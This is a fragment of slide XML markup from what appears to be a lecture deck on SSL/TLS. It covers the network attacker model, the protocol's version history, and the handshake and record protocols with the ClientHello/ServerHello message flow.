            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-32"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>integrity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-41"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>between</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-32"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-26"/>
              <a:t>two </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>communicating</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>applications”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
          </a:p>
          <a:p>
            <a:pPr marL="355680" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="819"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="355680" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Deployed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>in</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>every</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-72"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-75"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>browser;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>also</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-66"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-11"/>
              <a:t>VoIP, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>payment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-110"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>systems,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>distributed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-114"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
              <a:t>systems,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-110"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-21"/>
              <a:t>etc.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="0" strike="noStrike" spc="-1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5208540" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="18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0" indent="0" algn="r">
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>slide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-7">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:fld id="{023EF549-FF4F-44DA-B941-163934056A81}" type="slidenum">
              <a:rPr lang="en-US" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:rPr>
              <a:t>2</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" b="0" strike="noStrike" spc="-1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12731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1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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-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TLS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Guarantees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3072915" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="1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FA4F600-AD8B-47B1-B098-01C62CDD6575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835770" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1633320"/>
            <a:ext cx="8143559" cy="416585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556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End-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to-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end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communications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the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presence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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>network</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-6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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>attacker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99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Attacker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completely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owns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network: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controls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Wi-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Fi,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DNS,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routers,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own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websites,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listen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any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packet,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modify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packets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transit,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inject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his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own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packets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network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99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Scenario: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you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are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reading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your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email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an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Internet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café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connected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via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r00ted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Wi-Fi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access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point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dodgy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ISP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hostile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authoritarian country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9834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History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the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Protocol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4427552" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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C8764AE-AE60-4C94-8200-684B6C75C0B9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783890" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1559880"/>
            <a:ext cx="8185320" cy="486979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004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394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1.0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internal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Netscape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design,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early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1994?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258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Lost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mists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time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27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2.0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Netscape,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Nov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1994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283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Several</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-7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weaknesses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374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3.0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Netscape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Paul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Kocher,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Nov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1996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3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TLS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1.0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Internet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standard,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Jan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1999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619"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="583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Based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SSL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3.0,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but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interoperable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(uses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different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cryptographic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-9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algorithms)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3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TLS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1.1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Apr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2006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3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TLS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1.2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Aug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2008</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="354960" indent="-342360">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="3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spc="-21">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>TLS 1.3 – Aug 2018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62683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1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Basics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5272622" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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B2843AE-832E-453A-86C9-0306E458FB7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758343" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="7921440" cy="4226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consists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two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protocols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Handshake</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-13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protocol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99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Uses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public-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cryptography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establish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several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shared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between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server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8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Record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protocol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99000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="550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established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handshake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protocol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protect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confidentiality,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integrity,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and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authenticity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data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exchange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between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and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server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9991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Handshake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Protocol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5867104" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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16B64EA5-59D7-41ED-821B-C4FB001B4FFC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130868" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
            <a:ext cx="7962480" cy="6112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Runs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between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server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example,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=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Web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browser,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=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website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56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Negotiate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of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cryptographic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algorithms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used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05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Interoperability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between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different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implementations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Authenticate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(optional)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505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digital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learn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each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other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public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verify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each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other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identity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95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Often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only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authenticated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keys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establish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shared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secret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99450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Handshake</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-114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Protocol</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-11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Structure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498712593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63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8895723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7540793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67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24253549" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3592440" y="3733920"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3592440" y="3733920"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="70" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3677040" y="38098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object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3592440" y="37339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246725365" name="object 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1943280" y="4724280"/>
            <a:ext cx="3290400" cy="151920"/>
            <a:chOff x="1943280" y="4724280"/>
            <a:chExt cx="3290400" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="73" name="object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1943280" y="4800600"/>
              <a:ext cx="3206519" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3206520"/>
                <a:gd name="textAreaRight" fmla="*/ 3206880 w 32065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06750" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="32062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object 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4979880" y="47242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0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101600" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2540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77201341" name="object 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1918800" y="1834920"/>
            <a:ext cx="9770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ClientHello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351958" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5312880" y="2209320"/>
            <a:ext cx="1997280" cy="1749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0800" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="12600">
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="85"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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ServerHello, [Certificate], [ServerKeyExchange], [CertificateRequest], ServerHelloDone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4769031" name="object 18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78" name="object 19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object 20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9728153" name="object 21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208435" name="object 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1955160" y="3796920"/>
            <a:ext cx="1771200" cy="1170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>
              <a:lnSpc>
                <a:spcPct val="119000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="91"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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[Certificate], ClientKeyExchange, [CertificateVerify]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59537359" name="object 23"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981080" y="5486400"/>
            <a:ext cx="3290760" cy="151920"/>
            <a:chOff x="1981080" y="5486400"/>
            <a:chExt cx="3290760" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="83" name="object 24"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1981080" y="5562720"/>
              <a:ext cx="3206519" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3206520"/>
                <a:gd name="textAreaRight" fmla="*/ 3206880 w 32065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06750" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3206220" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="507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object 25"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5018039" y="548640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0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="101600" y="76200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2540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31140168" name="object 26"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3668760" y="6248520"/>
            <a:ext cx="3265560" cy="151920"/>
            <a:chOff x="3668760" y="6248520"/>
            <a:chExt cx="3265560" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="86" name="object 27"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3753360" y="63244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object 28"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3668760" y="62485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21771406" name="object 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4782600" y="5610960"/>
            <a:ext cx="2454480" cy="86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738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581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switch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negotiated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cipher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401480">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="479"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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Finished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2355077" name="object 30"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="609480" y="5510160"/>
            <a:ext cx="2982960" cy="966600"/>
            <a:chOff x="609480" y="5510160"/>
            <a:chExt cx="2982960" cy="966600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="90" name="object 31"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="609480" y="5510160"/>
              <a:ext cx="2982960" cy="966600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2982960"/>
                <a:gd name="textAreaRight" fmla="*/ 2983320 w 2982960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 966600"/>
                <a:gd name="textAreaBottom" fmla="*/ 966960 h 966600"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2983229" h="967104" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="1454170" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="497151" y="357183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="357183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="966783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="966783"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="357183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1242879" y="357183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="145417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object 32"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="609480" y="5510160"/>
              <a:ext cx="2982960" cy="966600"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2982960"/>
                <a:gd name="textAreaRight" fmla="*/ 2983320 w 2982960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 966600"/>
                <a:gd name="textAreaBottom" fmla="*/ 966960 h 966600"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2983229" h="967104" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="357182"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="497151" y="357182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1454169" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1242879" y="357182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="357182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="458782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="611182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2982912" y="966782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1242879" y="966782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="497151" y="966782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="966782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="611182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="458782"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="357182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7910472" name="object 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="688320" y="4822920"/>
            <a:ext cx="3729600" cy="1832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79440" indent="7560">
              <a:lnSpc>
                <a:spcPct val="135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switch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negotiated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cipher Finished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79440">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1018"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="0" algn="l"/>
              </a:tabLst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8000"/>
              </a:lnSpc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Record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all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sent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and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received</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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handshake</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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messages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38737" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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97F03246-6AA9-4006-909C-146A7310C73E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85985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ClientHello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66461827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96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5604945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121568" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1943280" y="2134800"/>
            <a:ext cx="3161880" cy="151920"/>
            <a:chOff x="1943280" y="2134800"/>
            <a:chExt cx="3161880" cy="151920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="100" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="194328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35251785" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2212200" y="1834920"/>
            <a:ext cx="9770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ClientHello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8009441" name="object 11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104" name="object 12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object 13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88922124" name="object 14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23848391" name="object 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="2844720" y="2066759"/>
            <a:ext cx="4317480" cy="1971360"/>
            <a:chOff x="2844720" y="2066759"/>
            <a:chExt cx="4317480" cy="1971360"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="108" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2844720" y="2066759"/>
              <a:ext cx="4317480" cy="1971360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4317480"/>
                <a:gd name="textAreaRight" fmla="*/ 4317840 w 4317480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1971360"/>
                <a:gd name="textAreaBottom" fmla="*/ 1971720 h 1971360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4318000" h="1971675" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="215900" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="719667" y="600075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="600075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1971675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="1971675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="600075"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1799165" y="600075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object 17"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2844720" y="2066759"/>
              <a:ext cx="4317480" cy="1971360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 4317480"/>
                <a:gd name="textAreaRight" fmla="*/ 4317840 w 4317480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 1971360"/>
                <a:gd name="textAreaBottom" fmla="*/ 1971720 h 1971360"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="4318000" h="1971675" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="600074"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="719666" y="600074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="215899" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1799166" y="600074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="600074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="828674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="1171574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4317998" y="1971674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1799166" y="1971674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="719666" y="1971674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1971674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1171574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="828674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="600074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81770145" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2923560" y="2652840"/>
            <a:ext cx="3982320" cy="158975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9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71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announces</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" u="sng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1800" b="0" u="sng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u="sng" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>plaintext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):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920" indent="-175320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="371"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="18792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Protocol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he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running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920" indent="-175320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="18792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Cryptographic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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algorithms</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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he</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1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supports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920" indent="-175320">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="439"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="18792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Fresh,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random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number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103253" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="2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6D48024-1D0E-42E7-9A65-D2B44E167F5E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668336" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="5171039" cy="1448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70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struct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{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45960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
